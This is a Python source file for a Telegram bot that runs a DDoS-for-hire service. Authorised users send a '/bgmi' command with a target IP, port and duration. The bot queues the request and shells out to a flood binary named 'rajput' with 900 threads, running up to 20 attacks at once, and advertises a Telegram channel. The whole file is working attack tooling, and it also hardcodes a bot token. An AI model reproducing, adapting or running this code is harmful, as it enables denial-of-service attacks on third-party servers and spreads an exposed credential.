import asyncio
import logging
import telebot
from threading import Thread
from queue import Queue
import re
import os
import json

# Hardcoded Bot Token
BOT_TOKEN = '7620447755:AAGmGrbo3WPJRdOHBw7ut9EVlK6BwFAY7QU'
bot = telebot.TeleBot(BOT_TOKEN)  # Set timeout to 60 seconds

# Set up logging
logging.basicConfig(level=logging.INFO)

# Path to the file where approved users are stored
APPROVED_USERS_FILE = 'approved_users.json'

# List of admin user IDs (can be modified here for multiple admins)
ADMIN_IDS = [18700457266]  # Replace with actual admin IDs

# Group information (replace with your group username or group ID)
GROUP_USERNAME = '@DDOSONLY123'  # The username of the group
GROUP_ID = None  # This will store the group ID of the authorized group

# Load approved users from the file
def load_approved_users():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, 'r') as file:
            return set(json.load(file))  # Return as a set for fast membership tests
    return set()

# Save approved users to the file
def save_approved_users(approved_users):
    with open(APPROVED_USERS_FILE, 'w') as file:
        json.dump(list(approved_users), file)

# Load initial approved users
approved_users = load_approved_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
attack_queue = Queue()  # Queue for managing attack requests
max_concurrent_attacks = 20  # Maximum number of concurrent attacks
loop = asyncio.new_event_loop()  # Create a new event loop

# Number of threads to use for attacks
THREADS = 900

# Async function to run attack command on Codespace
async def run_attack_command_on_codespace(bot: telebot.TeleBot, target_ip: str, target_port: int, duration: int, chat_id: int):
    command = f"./rajput {target_ip} {target_port} {duration} {THREADS}"
    logging.info(f"Running command: {command}")

    for attempt in range(3):  # Retry up to 3 times
        try:
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()

            output = stdout.decode().strip()
            error = stderr.decode().strip()

            if output:
                logging.info(f"Command output: {output}")
            if error:
                logging.error(f"Command error: {error}. Command: {command}")

            await send_message_with_retry(chat_id, f"Attack Finished Successfully 🚀\nTarget: {target_ip}:{target_port}\nDuration: {duration} seconds.  https://t.me/RAJPUTDDOS1")
            break  # Exit loop on success
        except Exception as e:
            logging.error(f"Attempt {attempt + 1} failed: {e}")
            if attempt < 2:  # If not the last attempt
                await asyncio.sleep(2)  # Wait before retrying
            else:
                await send_message_with_retry(chat_id, "❌ An error occurred while executing the attack command. Please try again later.")
        finally:
            attack_queue.task_done()  # Ensure this is called after each attempt

# Function to process attack queue
def process_attack_queue():
    while True:
        user_id, target_ip, target_port, duration, chat_id = attack_queue.get()

        # Process the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(bot, target_ip, target_port, duration, chat_id), loop)

# Attack command
@bot.message_handler(commands=['bgmi'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_private = message.chat.type == 'private'

    # Check if the message is from the authorized group
    global GROUP_ID
    if GROUP_ID is None:
        try:
            group_info = bot.get_chat(GROUP_USERNAME)
            GROUP_ID = group_info.id  # Save the group ID of the authorized group
            logging.info(f"Authorized group found with ID: {GROUP_ID}")
        except Exception as e:
            logging.error(f"Failed to get authorized group information: {e}")
            return

    # If the message is from a group that is NOT the authorized group
    if message.chat.type == 'supergroup' and chat_id != GROUP_ID:
        # If the user is not from the authorized group, deny access
        bot.send_message(chat_id, "❌ You are not authorized to use this bot. Please contact the bot owner for access.")
        return

    # If the message is from the authorized group, allow access
    if chat_id == GROUP_ID:
        try:
            member = bot.get_chat_member(GROUP_ID, user_id)
            if member.status in ['member', 'administrator', 'creator']:
                logging.info(f"User {user_id} is in the authorized group, skipping approval.")
                is_private = False  # Allow attack command directly in the group
            else:
                bot.send_message(chat_id, "❌ You are not authorized to use this bot. Please contact the bot owner for access.")
                return
        except Exception as e:
            logging.error(f"Error checking group membership: {e}")
            bot.send_message(chat_id, "❌ You are not authorized to use this bot.")

    # Now check if the user is approved or not
    if is_private and user_id not in approved_users:
        bot.send_message(chat_id, "❌ You are not approved to use this bot. Contact the bot owner for access.")
        return

    logging.info(f"Received command from user {user_id}: {message.text}")

    try:
        args = message.text.split()[1:]  # Get arguments after the command
        if len(args) != 3:
            bot.send_message(chat_id, "*Please use:\n /bgmi <IP> <PORT> <TIME>*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        # Validate IP address format
        if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", target_ip):
            bot.send_message(chat_id, "*Invalid IP address format.*", parse_mode='Markdown')
            return

        # Validate port range
        if not (1 <= target_port <= 65535):
            bot.send_message(chat_id, "*Port must be between 1 and 65535.*", parse_mode='Markdown')
            return

        # Validate duration
        if duration <= 0 or duration > 400:
            bot.send_message(chat_id, "*Duration must be greater than 0 and not more than 400 seconds.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Send confirmation message immediately after putting the attack in the queue
        bot.send_message(chat_id, "🚀 Attack Sent Successfully! 🚀\n\n"
                                   f"Target: {target_ip}:{target_port}\n"
                                   f"Attack Time: {duration} seconds\n\n"
                                   f"https://t.me/RAJPUTDDOS1\n")

        attack_queue.put((user_id, target_ip, target_port, duration, chat_id))

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "❌ An error occurred while processing your command. Please try again later.")


# Add approved user command
@bot.message_handler(commands=['add'])
def add_approved_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ You do not have permission to use this command.")
        return

    try:
        args = message.text.split()[1:]  # Get arguments after the command
        if len(args) != 1:
            bot.send_message(chat_id, "*Invalid command format. Please use:\n /add <User_Id>*", parse_mode='Markdown')
            return

        new_user_id = int(args[0])

        # Add user to the approved users set
        approved_users.add(new_user_id)

        # Save updated approved users to the file
        save_approved_users(approved_users)

        bot.send_message(chat_id, f"✅ User {new_user_id} has been approved.")
    except Exception as e:
        logging.error(f"Error in adding approved user: {e}")
        bot.send_message(chat_id, "❌ An error occurred while adding the user.")

# Remove approved user command
@bot.message_handler(commands=['rm'])
def remove_approved_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ You do not have permission to use this command.")
        return

    try:
        args = message.text.split()[1:]  # Get arguments after the command
        if len(args) != 1:
            bot.send_message(chat_id, "*Invalid command format. Please use:\n /rm <User_Id>*", parse_mode='Markdown')
            return

        user_to_remove = int(args[0])

        # Remove the user from the approved users set if they exist
        if user_to_remove in approved_users:
            approved_users.remove(user_to_remove)
            # Save updated approved users to the file
            save_approved_users(approved_users)
            bot.send_message(chat_id, f"✅ User {user_to_remove} has been removed from the approved list.")
        else:
            bot.send_message(chat_id, "❌ User not found in the approved users list.")
    except Exception as e:
        logging.error(f"Error in removing approved user: {e}")
        bot.send_message(chat_id, "❌ An error occurred while removing the user.")

# Start asyncio thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

# Start the bot
if __name__ == '__main__':
    # Start the processing thread for the attack queue
    Thread(target=process_attack_queue, daemon=True).start()

    # Start asyncio loop in a separate thread
    thread = Thread(target=start_asyncio_thread)
    thread.start()

    bot.polling()
